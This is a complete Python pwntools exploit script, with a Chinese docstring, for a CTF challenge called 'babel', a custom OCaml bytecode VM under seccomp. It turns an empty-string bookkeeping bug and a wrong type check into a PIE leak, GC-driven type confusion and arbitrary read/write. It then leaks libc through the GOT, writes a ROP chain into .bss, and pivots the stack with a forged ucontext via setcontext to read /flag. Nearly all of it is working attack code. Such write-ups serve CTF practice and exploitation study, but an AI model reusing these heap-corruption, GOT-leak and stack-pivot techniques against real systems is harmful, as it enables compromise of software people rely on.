#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
babel exploit (2026 强网杯)

目标：OCaml 写的自研字节码 VM（stripped / PIE / Full RELRO / NX，带 seccomp 白名单
read write close openat exit exit_group brk rt_sigprocmask，没有 execve）。

两个 bug（题解第 3 节）：
  Bug1 空串字面量记账错误：size 只算 0x10，长度却写成 1|0x80000000，dataOff=off+0x20。
       于是 sset(0) 能合法地把 1 字节写到紧邻下一个对象的 header type 上
       （把 array 的 type 从 1 改成 6，让压缩式 GC 跳过它）。
  Bug2 op 0x1e (setext) 的类型检查写成 tag==9，而正确判据是 +0x14==0xffffffff。
       用 GC 制造一个 tag9 但实际指向 array 的陈旧值即可走通，
       ext 表随即变成任意地址按字节读写。

链条：
  泄漏 PIE（ref 对象的 +0x18 = base+0x59098+8*kind，被压缩到陈旧偏移上）
  -> 造 tag9/array 混淆值 -> ext 任意读写
  -> 读 read@GOT 得 libc（2.39-0ubuntu8.9）
  -> 在 .bss 写 ROP：close(0) / open("/flag") / gets(buf) / puts(buf) / exit(0)
  -> 伪造 ucontext 并把 ext 表里的宿主函数指针改成 setcontext+0x3d，
     调用 host fn 0 时 rdx = &value_stack[count]，栈被切到 ROP。

说明：附件里的 VM 指令立即数排布按题解的指令表
（输入字节 + 立即数）实现了一个最小汇编器；换附件版本时只需核对 Asm 的编码。

用法：
    python exp.py TARGET_HOST PORT
    python exp.py --local ./babel
"""
import argparse
import struct
import sys

from pwn import context, log, process, remote

context.log_level = 'info'

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", b.ljust(8, b"\x00"))[0]

# ---------------------------------------------------------------- 偏移（题解常量表）
REF_LEAK = 0x590A0          # ref[0x18] = base + 0x59098 + 8*1
GOT_READ = 0x58D30
VS_COUNT = 0x97288
VS_BASE = 0x97290
EXT_FN0 = 0x75EC0
BSS = 0x100000

L_SETCONTEXT = 0x4A960
L_PIVOT = L_SETCONTEXT + 0x3D      # mov rsp, [rdx+0xa0]
L_POP_RDI = 0x10C08D
L_POP_RSI = 0x110B7D
L_RET = 0x10C08E
L_OPEN = 0x11B3F0
L_CLOSE = 0x1169B0
L_GETS = 0x87160
L_PUTS = 0x87CC0
L_EXIT = 0x47BA0
L_READ = 0x11BD20

BIG1 = 0x7F80
BIG2 = 0x8100

DEFAULT_HOST = "TARGET_HOST"
DEFAULT_PORT = 9999

LOCAL_CMD = ['./babel']


# ---------------------------------------------------------------- 汇编码
class Asm:
    """
    指令表（题解「指令分发」一节的"输入字节"），立即数按小端紧跟操作码：
        01 push imm64        02 pushstr <u32 len><bytes>
        08 arr <u8 n>        09 tuple <u8 n>
        0a getf <u8 i>       0b setf <u8 i>
        0c sget <u8 i>       0d sset <u8 i>
        0e len               10 getr <u8 r>   11 setr <u8 r>
        12 print             13 raw
        14 mkref <u8 kind>   15 callref
        16 alloc <u64 size>  17 extget <u8 slot>  18 extset <u8 slot>
        19 setext <u8 slot>  20 host <pad><fn><argc>
        1f drop             fe end
    """
    def __init__(self):
        self.buf = bytearray()

    def _u8(self, v):
        self.buf.append(v & 0xff)

    def _u64(self, v):
        self.buf += p64(v)

    def pushraw(self, v):
        self.buf.append(0x01); self._u64(v); return self

    def pushstr(self, s):
        if isinstance(s, str):
            s = s.encode()
        self.buf.append(0x02)
        self.buf += struct.pack("<I", len(s)) + s
        return self

    def arr(self, n):
        self.buf.append(0x08); self._u8(n); return self

    def tup(self, n):
        self.buf.append(0x09); self._u8(n); return self

    def getf(self, i):
        self.buf.append(0x0a); self._u8(i); return self

    def setf(self, i):
        self.buf.append(0x0b); self._u8(i); return self

    def sget(self, i):
        self.buf.append(0x0c); self._u8(i); return self

    def sset(self, i):
        self.buf.append(0x0d); self._u8(i); return self

    def length(self):
        self.buf.append(0x0e); return self

    def pushr(self, r):
        self.buf.append(0x10); self._u8(r); return self

    def popr(self, r):
        self.buf.append(0x11); self._u8(r); return self

    def show(self):
        self.buf.append(0x12); return self

    def raw(self):
        self.buf.append(0x13); return self

    def mkref(self, kind):
        self.buf.append(0x14); self._u8(kind); return self

    def callref(self):
        self.buf.append(0x15); return self

    def alloc(self, size):
        self.buf.append(0x16); self._u64(size); return self

    def extget(self, slot=0):
        self.buf.append(0x17); self._u8(slot); return self

    def extset(self, slot=0):
        self.buf.append(0x18); self._u8(slot); return self

    def setext(self, slot=0):
        self.buf.append(0x19); self._u8(slot); return self

    def host(self, pad, fn, argc):
        self.buf.append(0x20)
        self._u8(pad); self._u8(fn); self._u8(argc)
        return self

    def drop(self):
        self.buf.append(0x1f); return self

    def end(self):
        self.buf.append(0xfe); return self

    def bytes(self):
        return bytes(self.buf)


class Babel:
    def __init__(self, host=None, port=None, local=None):
        if local:
            self.io = process(local)
        else:
            self.io = remote(host, port)

    def chunk(self, asm):
        data = asm if isinstance(asm, (bytes, bytearray)) else asm.bytes()
        assert 1 <= len(data) <= 0x10000
        self.io.send(struct.pack("<I", len(data)) + bytes(data))
        return data

    def raw8(self):
        return self.io.recvn(8, timeout=5)

    def close(self):
        try:
            self.io.close()
        except Exception:
            pass


# ---------------------------------------------------------------- 原语
def leak_pie(vm):
    """chunk1：空的 1 字节越界 + 触发 GC，让 ref 落到陈旧偏移上。"""
    a = Asm()
    a.pushraw(0); a.arr(1); a.popr(0)          # U = array(1) @ 0x00
    a.mkref(1); a.popr(1)                      # R = ref(kind=1) @ 0x20
    a.pushstr(b''); a.popr(2)                  # E = 空串 @ 0x40, dataOff = 0x60
    a.pushr(0); a.arr(1); a.popr(3)            # V = array(1) @ 0x60, 元素 0 = U
    a.pushraw(0); a.popr(0)                    # 丢掉 U 的根
    a.pushr(2); a.pushraw(6); a.sset(0)        # 把 V 的 header type 改成 6
    a.pushstr(b'Z' * BIG1)                     # 触发 GC
    a.end()
    vm.chunk(a)

    b = Asm()
    b.pushr(3); b.getf(0); b.getf(0); b.raw()  # V[0] -> 陈旧值 -> R[+0x18]
    b.end()
    vm.chunk(b)
    leak = u64(vm.raw8())
    base = leak - REF_LEAK
    if base & 0xfff or base == 0:
        raise RuntimeError("bad PIE base %#x (leak %#x)" % (base, leak))
    return base


def make_stale(vm):
    """chunk2/3：把 alloc 出来的 tag9 偏移留成陈旧值，压缩后落到 array 上。"""
    a = Asm()
    a.drop().end()
    vm.chunk(a)

    b = Asm()
    b.pushstr(b'S' * 0x100)                    # 保活 + 触发 GC，游标回到 0xC0 附近
    b.alloc(0x100); b.popr(4)                  # B = alloc(0x100) @ 0xC0
    b.pushraw(0); b.arr(1); b.popr(5)          # T = array(1) @ 0xC0+0x20
    b.pushstr(b''); b.popr(6)                  # E2 @ 0xC0+0x40, dataOff = 0xC0+0x60
    b.pushr(4); b.arr(1); b.popr(7)            # V2 @ 0xC0+0x60, 元素 0 = B
    b.pushraw(0); b.popr(4)                    # 丢掉 B 的根
    b.pushr(6); b.pushraw(6); b.sset(0)        # V2.type = 6
    b.pushraw(0); b.popr(6)                    # 丢掉 E2 的根
    b.end()
    vm.chunk(b)

    c = Asm()
    c.pushstr(b'Y' * BIG2)                     # 触发 GC，B 被压缩掉，T 落到 0xC0
    c.end()
    vm.chunk(c)

    d = Asm()
    d.pushr(7); d.getf(0); d.raw()             # 取混淆值校验 tag == 9
    d.end()
    vm.chunk(d)
    stale = u64(vm.raw8())
    if stale & 0xf != 9:
        raise RuntimeError("type confusion failed: %#x" % stale)
    return stale


def set_target(vm, addr):
    a = Asm()
    a.pushr(7); a.getf(0)          # 取出 tag9 但指向 array 的混淆值
    a.pushraw(addr)                # 目标绝对地址
    a.setext(0)                    # ext[0] = {addr, 0x100000}
    a.end()
    vm.chunk(a)


def arb_read(vm, addr, n, chunk_max=200):
    out = bytearray()
    while len(out) < n:
        size = min(chunk_max, n - len(out))
        set_target(vm, addr + len(out))
        a = Asm()
        for i in range(size):
            a.pushraw(i); a.extget(0); a.raw()
        a.end()
        vm.chunk(a)
        blob = vm.io.recvn(size * 8, timeout=5)
        for i in range(size):
            out.append((u64(blob[8 * i:8 * i + 8]) >> 1) & 0xff)
    return bytes(out)


def arb_write(vm, addr, data, chunk_max=240):
    data = bytes(data)
    for off in range(0, len(data), chunk_max):
        part = data[off:off + chunk_max]
        set_target(vm, addr + off)
        a = Asm()
        for i, b in enumerate(part):
            a.pushraw(i); a.pushraw(b); a.extset(0)
        a.end()
        vm.chunk(a)


def wq(vm, addr, value):
    arb_write(vm, addr, p64(value))


# ---------------------------------------------------------------- 主利用
def exploit(host, port, local):
    vm = Babel(host, port, local)
    try:
        base = leak_pie(vm)
        log.success("PIE base = %#x" % base)

        make_stale(vm)
        log.success("stale tag9 value ready (type confusion)")

        read_got = u64(arb_read(vm, base + GOT_READ, 8))
        libc = read_got - L_READ
        if libc & 0xfff:
            raise RuntimeError("bad libc base %#x" % libc)
        if arb_read(vm, libc, 4) != b"\x7fELF":
            raise RuntimeError("libc ELF check failed")
        log.success("libc = %#x" % libc)

        # --- 在 .bss 里布置字符串 / 缓冲区 / ROP --------------------------
        flag_str = base + BSS + 0x400
        buf = base + BSS + 0x500
        chain = base + BSS + 0x600

        arb_write(vm, flag_str, b"/flag\x00")

        rop = [
            libc + L_POP_RDI, 0, libc + L_CLOSE,          # close(0)
            libc + L_POP_RDI, flag_str,
            libc + L_POP_RSI, 0, libc + L_OPEN,           # open("/flag", 0) -> fd 0
            libc + L_POP_RDI, buf, libc + L_GETS,         # gets(buf)
            libc + L_POP_RDI, buf, libc + L_PUTS,         # puts(buf)
            libc + L_POP_RDI, 0, libc + L_EXIT,
        ]
        arb_write(vm, chain, b"".join(p64(x) for x in rop))

        # --- 伪造 ucontext 并劫持 ext 表里的宿主函数指针 ------------------
        count = u64(arb_read(vm, base + VS_COUNT, 8))
        uctx = base + VS_BASE + 8 * count
        log.info("value stack count=%d, fake ucontext @ %#x" % (count, uctx))

        wq(vm, uctx + 0x88, 0x200)
        wq(vm, uctx + 0xa0, chain)              # uc_mcontext.rsp
        wq(vm, uctx + 0xa8, libc + L_RET)       # uc_mcontext.rip
        wq(vm, base + EXT_FN0, libc + L_PIVOT)  # ext fn0 -> setcontext+0x3d

        a = Asm()
        a.host(0, 0, 0)                         # rdx = &value_stack[count] = uctx
        a.end()
        vm.chunk(a)

        out = vm.io.recvall(timeout=5)
        return out
    finally:
        vm.close()


def main():
    ap = argparse.ArgumentParser(description="babel exploit")
    ap.add_argument("host", nargs="?", default=DEFAULT_HOST)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    ap.add_argument("--local", metavar="BIN", default=None)
    args = ap.parse_args()

    out = exploit(args.host, args.port, args.local)
    text = out.decode("latin-1", "replace")
    idx = text.find("flag{")
    if idx >= 0:
        end = text.find("}", idx)
        print("[+] FLAG:", text[idx:end + 1])
    else:
        print("[*] output:", repr(out[-2048:]))


if __name__ == "__main__":
    main()
